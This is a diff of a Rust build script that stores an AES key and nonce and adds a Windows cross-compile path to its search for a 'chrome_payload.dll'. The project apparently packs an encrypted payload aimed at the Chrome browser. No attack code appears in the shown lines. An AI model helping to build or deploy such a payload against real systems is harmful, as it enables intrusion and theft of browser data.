@@ -102,9 +102,10 @@ fn main() {
     fs::write(&key_path,   &aes_key).expect("write payload_key.bin");
     fs::write(&nonce_path, &aes_nonce).expect("write payload_nonce.bin");
 
-    // Find the payload DLL
+    // Find the payload DLL — check cross-compile output dir first, then native
     let candidates = [
         env::var("CHROME_PAYLOAD_DLL").ok().map(PathBuf::from),
+        Some(manifest_dir.join("target/x86_64-pc-windows-gnu/release/chrome_payload.dll")),
         Some(manifest_dir.join("target/release/chrome_payload.dll")),
         Some(manifest_dir.join("src/payload/target/release/chrome_payload.dll")),
         env::var("CARGO_TARGET_DIR")
